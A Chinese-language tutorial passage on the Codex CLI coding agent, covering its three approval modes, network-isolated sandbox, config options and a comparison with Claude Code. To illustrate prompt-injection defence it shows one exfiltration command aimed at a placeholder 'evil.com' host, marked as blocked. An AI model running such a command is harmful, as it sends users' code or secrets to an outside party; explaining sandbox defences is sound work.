OpenAI Codex CLI 是一个开源的终端 AI 编程代理，基于 OpenAI 的 o3/o4-mini 等推理模型，能在你的本地环境中读写文件、执行命令、进行多步推理。它的核心卖点是**安全沙箱**和**灵活的审批模式**——你可以精确控制 AI 能做什么、不能做什么。

### 三种审批模式 —— 安全的灵魂

| 模式 | 文件操作 | Shell 命令 | 适用场景 |
|------|----------|------------|----------|
| **suggest**（默认） | 需确认 | 需确认 | 初次使用、敏感项目 |
| **auto-edit** | 自动执行 | 需确认 | 日常开发 |
| **full-auto** | 自动执行 | 自动执行（沙箱内） | 批量任务、CI/CD |

```bash
# 日常开发推荐
codex --approval-mode auto-edit

# 批量重构、信任 AI 时
codex --approval-mode full-auto "把所有 var 替换为 const/let"
```

关键区别：即使在 `full-auto` 模式下，所有命令也运行在**网络隔离的沙箱**里，AI 无法访问互联网或影响沙箱外的系统。

## 第四章：沙箱与安全

### 沙箱机制

Codex 的安全模型是其最大亮点之一：

```
┌─────────────────────────────────────────┐
│  Codex CLI（主进程）                      │
│                                         │
│  ┌───────────────────────────────────┐  │
│  │  沙箱环境                          │  │
│  │  ✓ 文件读写（仅项目目录内）          │  │
│  │  ✓ Shell 命令执行                  │  │
│  │  ✗ 网络访问（完全隔离）             │  │
│  │  ✗ 访问项目外文件                  │  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

**macOS** 上使用 Apple Seatbelt (`sandbox-exec`) 实现隔离；**Linux** 上使用 Docker 容器或 Landlock/iptables 组合。

### 网络隔离的意义

即使 AI 模型被提示注入攻击，它也无法：
- 外泄源代码到外部服务器
- 下载恶意依赖
- 调用未经授权的 API
- 反弹 Shell

```bash
# full-auto 下执行的命令示例
# ✓ 允许：本地文件操作
cat src/main.ts
npm run build        # 使用本地缓存的依赖

# ✗ 拒绝：网络请求
curl https://evil.com/exfil?data=...    # 被沙箱拦截
npm install new-pkg                      # 需要网络，被拦截
```

### 自定义沙箱权限

```yaml
# .codex/config.yaml
sandbox:
  # 允许写入的路径（默认仅项目目录）
  writable_paths:
    - "./src"
    - "./tests"
    - "/tmp"
  # 允许网络访问的域名（谨慎使用）
  network_allow:
    - "registry.npmjs.org"
```

## 第八章：对比与选择

### Codex CLI vs Claude Code

| 维度 | Codex CLI | Claude Code |
|------|-----------|-------------|
| **开源** | 完全开源（Apache 2.0） | 闭源 |
| **模型** | OpenAI 系列（o3/o4-mini/GPT-4.1） | Claude 系列（Opus/Sonnet） |
| **安全** | 网络隔离沙箱 | 权限白名单 + 确认机制 |
| **配置文件** | AGENTS.md | CLAUDE.md |
| **审批** | 三级模式 | 权限层级系统 |
| **生态** | 兼容 OpenAI API 格式提供商 | MCP 协议生态 |
| **隔离** | 内置沙箱 | Git Worktree |
| **定价** | 按 API 调用计费 | 订阅制（Max/Pro） |

### 什么时候选 Codex？

- 你需要完全开源、可审计的工具
- 你已经在用 OpenAI API，不想切换
- 安全合规要求严格，需要网络隔离沙箱
- 你想基于它做二次开发或定制

### 什么时候选 Claude Code？

- 你需要更丰富的生态（MCP、Skills、Hooks）
- 你需要跨会话记忆和上下文管理
- 你偏好 Claude 模型的代码能力
- 你需要 Worktree 并行开发和 /batch 批量操作
